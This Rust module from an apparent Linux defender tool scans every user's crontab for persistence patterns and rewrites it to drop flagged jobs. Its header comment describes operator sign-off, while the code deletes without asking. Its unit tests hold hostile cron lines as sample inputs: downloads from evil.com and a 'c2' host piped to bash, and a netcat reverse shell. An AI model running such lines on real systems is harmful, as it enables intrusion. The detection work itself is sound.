//! Scheduled jobs in user crontabs.
//!
//! A cron job that re-establishes a foothold every minute survives any cleanup
//! that does not look here. Each user's crontab is analysed for patterns that
//! distinguish persistence (download-and-exec, reverse shells, tmp execution)
//! from legitimate scheduling. Suspicious entries get a Remove verdict with the
//! matched patterns listed as context so the operator can sign off with one key.

use std::io::Write;
use std::path::PathBuf;
use std::process::{Command, Stdio};

use crate::core::{
    DefenderContext, DefenderError, Finding, Result, Severity, Verdict, collect_users,
    require_root, try_clear_immutable,
};
use crate::core::scan::{suspicious_matches, references_untrusted_dir};

/// Cron-specific patterns not covered by `core::scan::suspicious_matches`.
struct CronPattern {
    name: &'static str,
    needle: &'static str,
}

const CRON_EXTRA_PATTERNS: &[CronPattern] = &[
    CronPattern { name: "nohup background", needle: "nohup" },
    CronPattern { name: "chmod +x", needle: "chmod +x" },
];

/// Walk every user's crontab.  Suspicious entries are logged as evidence and
/// immediately removed; benign-looking entries are surfaced as Info findings.
pub fn run(ctx: &DefenderContext) -> Result {
    if require_root().is_err() {
        if !ctx.in_tui() {
            eprintln!("[!] Not running as root — cron check skipped");
        }
        ctx.emit(Finding::new(
            Severity::Medium,
            "cron",
            "Not running as root — cron check skipped",
            "Run as root to review user crontabs.",
        ));
        return Err(DefenderError::NotRoot);
    }

    ctx.log_msg("[+] Checking crontabs...");

    for user in collect_users()? {
        ctx.debug(&format!("Checking crontab for {}", user));

        let lines = get_crontab_lines(&user)?;
        if lines.is_empty() {
            continue;
        }

        let all_jobs: Vec<String> = lines
            .iter()
            .map(|s| s.as_str())
            .filter(|l| {
                let t = l.trim();
                !t.is_empty() && !t.starts_with('#')
            })
            .map(str::to_string)
            .collect();

        if all_jobs.is_empty() {
            continue;
        }

        let crontab_path = PathBuf::from(format!("/var/spool/cron/crontabs/{}", user));
        let mtime_label = crontab_path
            .metadata()
            .ok()
            .and_then(|m| m.modified().ok())
            .map(|t| ctx.mtime_label(t))
            .unwrap_or_else(|| "unavailable".into());

        let (suspicious, benign): (Vec<_>, Vec<_>) = all_jobs
            .iter()
            .partition(|j| !matched_patterns(j).is_empty());

        if !suspicious.is_empty() {
            // Phase 1: log evidence for each suspicious job
            for job in &suspicious {
                ctx.log_msg(&format!("[!] Suspicious cron job for {}: {}", user, job));
                ctx.log_evidence_line(&format!("crontab:{}", user), job);
            }

            // Phase 2: clear any immutable flag, then rewrite crontab with only the benign jobs
            let spool = PathBuf::from(format!("/var/spool/cron/crontabs/{}", user));
            try_clear_immutable(&spool);
            let kept: Vec<String> = benign.iter().map(|s| s.to_string()).collect();
            let rewrite_ok = write_crontab(&kept, &user).is_ok();

            // Phase 3: prove the suspicious jobs are gone
            let proof_lines = get_crontab_lines(&user).unwrap_or_default();
            for job in &suspicious {
                let still_present = proof_lines.iter().any(|l| l.contains(job.as_str()));
                let proof_msg = format!(
                    "══ PROOF: '{}' still_present={} in crontab:{} ══",
                    &job[..job.len().min(50)],
                    still_present,
                    user
                );
                ctx.log_msg(&proof_msg);
                let _ = ctx.log(&proof_msg);

                let patterns = matched_patterns(job);
                ctx.emit(
                    Finding::new(
                        Severity::High,
                        "cron",
                        format!(
                            "Cron backdoor REMOVED for {}: {} ({})",
                            user,
                            &job[..job.len().min(60)],
                            if rewrite_ok && !still_present {
                                "removed"
                            } else {
                                "NOT removed"
                            },
                        ),
                        format!(
                            "user: {}\njob: {}\npatterns: {}\nremoved: {}",
                            user,
                            job,
                            patterns.join(", "),
                            rewrite_ok && !still_present,
                        ),
                    )
                    .with_context("user", user.to_string())
                    .with_context("job", job.to_string())
                    .with_context("patterns", patterns.join(", "))
                    .with_context("removed", (rewrite_ok && !still_present).to_string())
                    .with_context("crontab mtime", mtime_label.clone())
                    .with_verdict(
                        Verdict::Remove,
                        format!(
                            "Suspicious cron job for {} matched patterns [{}]. \
                             Crontab was rewritten to remove it. Evidence and proof logged.",
                            user,
                            patterns.join(", ")
                        ),
                    ),
                );
            }
        }

        // Emit Info findings for benign jobs (visibility without alarming).
        for job in &benign {
            ctx.emit(
                Finding::new(
                    Severity::Info,
                    "cron",
                    format!("Cron job for {}: {}", user, &job[..job.len().min(60)]),
                    format!("user: {}\njob: {}", user, job),
                )
                .with_context("user", user.to_string())
                .with_context("job", job.to_string())
                .with_context("crontab mtime", mtime_label.clone())
                .with_verdict(
                    Verdict::Investigate,
                    format!(
                        "No malicious patterns matched — verify this job is expected for '{}'.",
                        user
                    ),
                ),
            );
        }
    }

    ctx.log_msg("[✓] Crontab check complete");
    Ok(())
}

/// Return the names of all suspicious patterns that match `job`.
fn matched_patterns(job: &str) -> Vec<String> {
    let lower = job.to_lowercase();
    // Start with the shared behavioral patterns from core/scan.rs
    let mut reasons: std::collections::BTreeSet<String> = suspicious_matches(job)
        .into_iter()
        .map(|s| s.to_string())
        .collect();
    // Also flag execution from untrusted directories
    if references_untrusted_dir(job) {
        reasons.insert("execution from untrusted directory".to_string());
    }
    // Add cron-specific extras not in core scan
    for p in CRON_EXTRA_PATTERNS {
        if lower.contains(p.needle) {
            reasons.insert(p.name.to_string());
        }
    }
    reasons.into_iter().collect()
}

/// Every line of one user's crontab, or empty if they have none.
fn get_crontab_lines(user: &str) -> Result<Vec<String>> {
    let output = Command::new("crontab")
        .args(["-l", "-u", user])
        .output()
        .map_err(|e| DefenderError::Command(format!("crontab -l -u {}: {}", user, e)))?;

    if !output.status.success() {
        return Ok(Vec::new());
    }

    let stdout = String::from_utf8_lossy(&output.stdout);
    Ok(stdout.lines().map(str::to_string).collect())
}

/// Write `jobs` back to `user`'s crontab via `crontab -`.
fn write_crontab(jobs: &[String], user: &str) -> Result {
    let new_cron = jobs.join("\n");

    let mut child = Command::new("crontab")
        .args(["-", "-u", user])
        .stdin(Stdio::piped())
        .spawn()
        .map_err(|e| DefenderError::Command(format!("spawn crontab for {}: {}", user, e)))?;

    let stdin = child
        .stdin
        .as_mut()
        .ok_or_else(|| DefenderError::Command("failed to open crontab stdin".into()))?;
    stdin.write_all(new_cron.as_bytes())?;

    let status = child.wait()?;
    if !status.success() {
        return Err(DefenderError::Command(format!(
            "crontab write for {} exited with {}",
            user, status
        )));
    }

    Ok(())
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn clean_job_matches_nothing() {
        assert!(matched_patterns("0 2 * * * /usr/bin/backup.sh").is_empty());
    }

    #[test]
    fn wget_download_is_flagged() {
        let patterns = matched_patterns("* * * * * wget http://evil.com/shell.sh -O /tmp/s");
        assert!(patterns.iter().any(|p| p.contains("fetches remote content")));
        assert!(patterns.iter().any(|p| p.contains("untrusted directory")));
    }

    #[test]
    fn pipe_to_bash_is_flagged() {
        let patterns = matched_patterns("*/5 * * * * curl http://c2/payload | bash");
        assert!(patterns.iter().any(|p| p.contains("fetches remote content")));
        assert!(patterns.iter().any(|p| p.contains("shell")));
    }

    #[test]
    fn mkfifo_reverse_shell_is_flagged() {
        let patterns = matched_patterns("* * * * * mkfifo /tmp/f; nc -e /bin/sh 10.0.0.1 4444");
        assert!(patterns.iter().any(|p| p.contains("named pipe")));
        assert!(patterns.iter().any(|p| p.contains("netcat")));
    }

    #[test]
    fn base64_is_flagged_once() {
        // Two base64 patterns in core/scan.rs share a reason; should deduplicate.
        let patterns = matched_patterns("* * * * * echo dGVzdA== | base64 -d | base64 --decode");
        let count = patterns
            .iter()
            .filter(|p| p.contains("base64"))
            .count();
        assert_eq!(count, 1);
    }
}
